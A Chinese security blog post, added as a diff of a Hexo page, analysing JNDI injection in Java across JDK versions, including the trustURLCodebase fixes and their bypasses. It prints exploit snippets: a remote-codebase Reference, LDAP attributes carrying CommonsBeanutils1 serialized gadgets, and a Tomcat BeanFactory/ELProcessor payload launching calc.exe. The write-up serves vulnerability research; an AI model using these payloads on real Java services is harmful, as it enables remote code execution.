@@ -1,0 +1,680 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/ico.png">
+  <link rel="icon" href="/img/ico.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="pwnull">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="JNDI注入的利用根据JDK更新历史可以分为两个阶段，第一阶段是在JDK8u191之前，攻击者可以利用自搭建的RMI&amp;#x2F;LDAP恶意服务器，让客户端去获取并加载我们放置的恶意类，该阶段的利用手法不受classpath是否拥有Gadget的限制。第二阶段是在JDK8u191之后，JDK增加了trustURLCodebase配置导致这种加载恶意类的方式失效，进而找出了 javaSerializ">
+  
+  
+  
+  <title>当我们谈论JNDI注入时，我们在谈论什么 - pwnull的自留地</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pwnull.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>pwnull的自留地</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="当我们谈论JNDI注入时，我们在谈论什么"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-05 10:00" pubdate>
+          2022-11-05
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          7.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          63 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">当我们谈论JNDI注入时，我们在谈论什么</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>JNDI注入的利用根据JDK更新历史可以分为两个阶段，第一阶段是在JDK8u191之前，攻击者可以利用自搭建的RMI&#x2F;LDAP恶意服务器，让客户端去获取并加载我们放置的恶意类，该阶段的利用手法不受classpath是否拥有Gadget的限制。第二阶段是在JDK8u191之后，JDK增加了trustURLCodebase配置导致这种加载恶意类的方式失效，进而找出了 javaSerializedData、javaReferenceAddress放置Gadget、ObjectFactory#getObjectInstance触发敏感方法的方式，这种方式虽然不受JDK版本的限制，但是受限于目标的classpath是否拥有可利用的Gadget。而寻找通用性更强、使用范围更广的Gadget链还值得深入研究。</p>
+<p>JNDI注入实际上就是控制lookup()的参数，使客户端去访问恶意的RMI&#x2F;LDAP服务去加载恶意对象，从而完成代码执行漏洞利用。按照利用手法可以分为：Reference#codebase的利用、本地ClassPath的Gadget利用、本地ClassPath的ObjectFactory+Gadget的利用。</p>
+<p>环境相关：</p>
+<p>本次测试使用版本：JDK8u112、JDK8u121、JDK8u144、JDK8u191、JDK8u341</p>
+<p>JDK版本下载：<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p>
+<h2 id="1、JNDI-with-RMI"><a href="#1、JNDI-with-RMI" class="headerlink" title="1、JNDI with RMI"></a>1、JNDI with RMI</h2><h3 id="1-1-RMI-Reference-codebase-的远程利用"><a href="#1-1-RMI-Reference-codebase-的远程利用" class="headerlink" title="1.1 RMI Reference#codebase 的远程利用"></a>1.1 RMI Reference#codebase 的远程利用</h3><p>在使用lookup查找获取远程服务器上绑定的对象时，若指定的远程地址为rmi，则会进入com.sun.jndi.rmi.registry.RegistryContext#lookup(javax.naming.Name)流程，如果拿到的是Reference对象，那么会进入到加载Factory的代码逻辑，调用栈及原理如下</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span>.RegistryContext<span class="hljs-selector-id">#lookup</span>(javax<span class="hljs-selector-class">.naming</span>.Name)<br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span>.RegistryContext<span class="hljs-selector-id">#decodeObject</span><br>javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.spi</span>.NamingManager<span class="hljs-selector-id">#getObjectInstance</span><br>javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.spi</span>.NamingManager#getObjectFactoryFromReference<br></code></pre></td></tr></table></figure>
+
+<p>如果在本地classpath中找不到我们指定的factory类（1），那么就会去远程codebase（2）去下载class字节码（3）回来并实例化（4）。 图为JDK8u112的代码</p>
+<p><img src="/img/jndi-injection-history/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>若JDK8u112版本中，我们指定codebase为http地址，放置我们构造的恶意类，lookup发起请求即可执行Evil类静态代码块中的代码</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">Reference</span> <span class="hljs-keyword">reference</span> = new <span class="hljs-keyword">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;Evil&quot;</span>,<span class="hljs-string">&quot;http://192.168.232.145:8888/&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/jndi-injection-history/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>修复：com.sun.jndi.rmi.registry.RegistryContext#decodeObject在JDK 8u121时增加了trustURLCodebase&#x3D;false的配置，这样就造成：如果想通过下图标签1的判断而不报错退出，只能让codebase(var8.getFactoryClassLocation())为空，这样factory只能为本地类，无法去外部加载恶意类了</p>
+<p><img src="/img/jndi-injection-history/3.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="2、Tomcat-BeanFactory-getObjectInstance的本地利用"><a href="#2、Tomcat-BeanFactory-getObjectInstance的本地利用" class="headerlink" title="2、Tomcat BeanFactory#getObjectInstance的本地利用"></a>2、Tomcat BeanFactory#getObjectInstance的本地利用</h2><p>我们看下如何去绕过修复补丁，在恶意服务器创建Reference对象时，可以指定classFactoryLocation为空，这样就会过掉上图标签1的判断</p>
+<p><img src="/img/jndi-injection-history/4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/jndi-injection-history/5.png" srcset="/img/loading.gif" lazyload></p>
+<p>接着继续调用到javax.naming.spi.NamingManager#getObjectInstance，在该方法中完成三步：classFactory类名获取（1）、classFactory的实例化（2）、调用getObjectInstance方法（3）。在上一章节触发代码执行的是2中classFactory的实例化，现在由于补丁的限制导致classFactoryLocation为空，所以classFactory只能指定为本地ClassPath中存在的类，系统在实例化后会调用classFactory#getObjectInstance方法，即下图的标签3</p>
+<p><img src="/img/jndi-injection-history/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>那么现在想要继续完成漏洞利用，需要在本地ClassPath中找到一个类，其实现了javax.naming.spi.ObjectFactory接口、且静态代码块&#x2F;getObjectInstance方法存在敏感操作。 Veracode找到了Tomcat中的org.apache.naming.factory.BeanFactory，Tomcat的使用相当广泛，所以这个链的实战价值还是很高的</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml">//pom.xml<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>pom.xml添加引入Tomcat后，我们分析下这条链：org.apache.naming.factory.BeanFactory#getObjectInstance方法中会对传入的className进行实例化、使用JDK的内省机制java.beans.Introspector#getBeanInfo  获取属性（存在getter&#x2F;setter方法的属性才会被识别），但同时该方法也提供了”别名机制“：基于传入的forceString字符串，根据&#x3D;分割拿到要执行的”setter别名方法”及String类型的参数值，最后调用反射执行。这样Gadget的source点就从”ObjectFactory接口实现类的getObjectInstance方法”变成了”本地任意类包含String类型参数的方法”</p>
+<p><img src="/img/jndi-injection-history/7.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/jndi-injection-history/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>而Tomcat8自带的javax.el.ELProcessor#eval(String)满足该条件，可执行传入的java代码进行利用。</p>
+<p><img src="/img/jndi-injection-history/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>构造格式如下：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br><span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;evil code&quot;</span>));<br></code></pre></td></tr></table></figure>
+
+<p>分割得到eval方法、String参数，添加至forced map中</p>
+<p><img src="/img/jndi-injection-history/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>最终从forced拿出方法，利用反射执行javax.el.ELProcessor#eval(“evil code”)</p>
+<p><img src="/img/jndi-injection-history/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>至此，绕过了JDK8u121的修复</p>
+<h2 id="3、JNDI-with-Ldap"><a href="#3、JNDI-with-Ldap" class="headerlink" title="3、JNDI with Ldap"></a>3、JNDI with Ldap</h2><h3 id="3-1、Ldap-javaSerializedData的本地利用"><a href="#3-1、Ldap-javaSerializedData的本地利用" class="headerlink" title="3.1、Ldap javaSerializedData的本地利用"></a>3.1、Ldap javaSerializedData的本地利用</h3><p>上面讲到了利用恶意RMI服务器进行漏洞利用，在JDK中还有ldap可以使用。当lookup请求地址的协议为ldap时，会走到com.sun.jndi.ldap.LdapCtx#c_lookup进行处理解析。从整体的代码结构看，涉及EXP构造的代码部分有4处：1获取ldap请求的结果、2解析结果拿到attribute属性值、3根据attribute的属性组装Reference类、4加载远程的恶意class并实例化造成代码执行。其中第4步与上章节中的JNDI_RMI解析调用流程一致，但是JDK8u121是在RegistryContext#decodeObject层做的trustURLCodebase修复限制，与ldap使用codebase加载factory类的流程无关联。所以JNDI_RMI的修复方案并不影响JNDI_LDAP的利用</p>
+<p><img src="/img/jndi-injection-history/12.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果存在javaClassName属性，则进入到com.sun.jndi.ldap.Obj#decodeObject组装Reference的流程。代码比较清晰，也是EXP构造比较重要的一步，逐个分析下：标签1 如果存在javaSerializedData属性值，进入deserializeObject反序列化操作。从属性名字能看出来是java的序列化数据，且在反序列化过程中未做过滤。所以我们可以把恶意对象绑定在javaSerializedData属性上，这是JNDI-LDAP的第一个利用点</p>
+<p><img src="/img/jndi-injection-history/13.png" srcset="/img/loading.gif" lazyload></p>
+<p>com.sun.jndi.ldap.Obj#deserializeObject</p>
+<p><img src="/img/jndi-injection-history/14.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="3-2、Ldap-javaReferenceAddress的本地利用"><a href="#3-2、Ldap-javaReferenceAddress的本地利用" class="headerlink" title="3.2、Ldap javaReferenceAddress的本地利用"></a>3.2、Ldap javaReferenceAddress的本地利用</h3><p>接着回到decodeObject往下走：标签2 如果存在javaRemoteLocation属性值，就进入decodeRmiObject操作：根据javaClassName、javaRemoteLocation、javaCodeBase等属性值组装Reference对象并返回</p>
+<p><img src="/img/jndi-injection-history/15.png" srcset="/img/loading.gif" lazyload></p>
+<p>接着回到decodeObject往下走：进入标签3 如果存在objectClass属性且其包括javaNamingReference，则进入com.sun.jndi.ldap.Obj#decodeReference组装Reference的操作</p>
+<p><img src="/img/jndi-injection-history/16.png" srcset="/img/loading.gif" lazyload></p>
+<p>当存在javaClassName属性时，最终返回对象<code>Reference(javaClassName, javaFactory, javacodebase[0])</code>。如果存在javaReferenceAddress值，进入组装RefAddr对象的流程，可以看到如果构造的数据满足条件，与javaSerializedData属性的解析过程一样，进入deserializeObject反序列化流程，这是JNDI-LDAP的第二个利用点</p>
+<p><img src="/img/jndi-injection-history/17.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="3-3、Ldap-Reference-codebase的远程利用"><a href="#3-3、Ldap-Reference-codebase的远程利用" class="headerlink" title="3.3、Ldap Reference#codebase的远程利用"></a>3.3、Ldap Reference#codebase的远程利用</h3><p>拿到了Reference对象，接着回到com.sun.jndi.ldap.LdapCtx#c_lookup的解析流程，执行第4步的getObjectInstance方法，该方法与JNDI_RMI解析过程的javax.naming.spi.NamingManager#getObjectInstance一致，都是获取codebase加载远程factory类并实例化。这是JNDI-LDAP的第三个利用点</p>
+<p><img src="/img/jndi-injection-history/18.png" srcset="/img/loading.gif" lazyload></p>
+<p>修复：com.sun.naming.internal.VersionHelper12#loadClass(java.lang.String, java.lang.String)加载外部factory时，在JDK 8u191时增加了com.sun.jndi.ldap.object.trustURLCodebase&#x3D;false的配置，造成loadClass()直接返回null，无法通过codebase去加载构造的外部恶意类。但是上面提到的第一种javaSerializedData、第二种RefAddr方式仍然可以使用</p>
+<p><img src="/img/jndi-injection-history/19.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/jndi-injection-history/20.png" srcset="/img/loading.gif" lazyload></p>
+<p>基本的解析流程都分析完了，本地测试时可以起个ldap服务构造EXP，搭建ldap服务可使用ldapsdk包。可以maven加载也可以单独引入：<a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1">https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">//pom.xml<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>ldap服务代码可参考<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java</a></p>
+<h2 id="4、版本相关问题"><a href="#4、版本相关问题" class="headerlink" title="4、版本相关问题"></a>4、版本相关问题</h2><p>JDK8系列最新版本(8u341)测试，未对JNDI_LDAP的第一种javaSerializedData、第二种javaReferenceAddress、Tomcat BeanFactory#getObjectInstance的利用方式进行限制。如果目标ClassPath存在Gadget，还是可以继续利用的。我们分别来看下：</p>
+<p>1、JNDI_LDAP的第一种javaSerializedData利用方式，只需要把恶意类设置为javaSerializedData的属性值即可</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//恶意服务端设置两个属性javaClassName、javaSerializedData</span><br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Serializer.<span class="hljs-params">serialize</span>(<span class="hljs-params">new</span> CommonsBeanutils1()</span>.get<span class="hljs-constructor">Object(<span class="hljs-string">&quot;mspaint&quot;</span>)</span>));<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/jndi-injection-history/21.png" srcset="/img/loading.gif" lazyload></p>
+<p>2、JNDI_LDAP的第二种javaReferenceAddress利用方式，对于RefAddr对象的数据构造可参考com.sun.jndi.ldap.Obj#decodeReference</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-number">1</span>、将javaReferenceAddress属性值的首字符做为分割符，我这里使用!符号<br><span class="hljs-number">2</span>、第一跟第二个分隔符中为RefAddr position，<span class="hljs-type">int</span>类型数据，使用<span class="hljs-number">1</span><br><span class="hljs-number">3</span>、第二跟第三个分隔符中为RefAddr type，<span class="hljs-type">String</span>类型数据，使用a<br><span class="hljs-number">4</span>、第三个与第四个分隔符在一起，后面是经过base64编码的序列化数据，使用cb链演示<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/jndi-injection-history/22.png" srcset="/img/loading.gif" lazyload></p>
+<p>恶意服务端设置三个属性objectClass、javaClassName、javaReferenceAddress</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaReferenceAddress&quot;</span>,<span class="hljs-string">&quot;!1!a!!&quot;</span>+<span class="hljs-params">new</span> BASE64Encoder()</span>.encode(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Serializer</span>.</span></span>serialize(<span class="hljs-keyword">new</span> <span class="hljs-constructor">CommonsBeanutils1()</span>.get<span class="hljs-constructor">Object(<span class="hljs-string">&quot;mspaint&quot;</span>)</span>)));<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/jndi-injection-history/23.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功在JDK8系列最新版本完成利用</p>
+<p>3、Tomcat BeanFactory#getObjectInstance的本地利用方式，可以看到在JDK8系列的最新版本8u341利用成功</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ResourceRef resourceRef = <span class="hljs-built_in">new</span> ResourceRef(&quot;javax.el.ELProcessor&quot;,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">false</span>,&quot;org.apache.naming.factory.BeanFactory&quot;,<span class="hljs-keyword">null</span>);<br>resourceRef.<span class="hljs-keyword">add</span>(<span class="hljs-built_in">new</span> StringRefAddr(&quot;forceString&quot;,&quot;x=eval&quot;));<br>resourceRef.<span class="hljs-keyword">add</span>(<span class="hljs-built_in">new</span> StringRefAddr(&quot;x&quot;,&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;<span class="hljs-built_in">new</span> java.lang.ProcessBuilder[<span class="hljs-string">&#x27;(java.lang.String[])&#x27;</span>]([<span class="hljs-string">&#x27;calc.exe&#x27;</span>]).<span class="hljs-keyword">start</span>()\&quot;)&quot;));<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/jndi-injection-history/24.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="5、参考"><a href="#5、参考" class="headerlink" title="5、参考"></a>5、参考</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA">https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>
+<p><a target="_blank" rel="noopener" href="https://evilpan.com/2021/12/13/jndi-injection/">https://evilpan.com/2021/12/13/jndi-injection/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/JavaSec/">#JavaSec</a>
+      
+        <a href="/tags/JNDI/">#JNDI</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
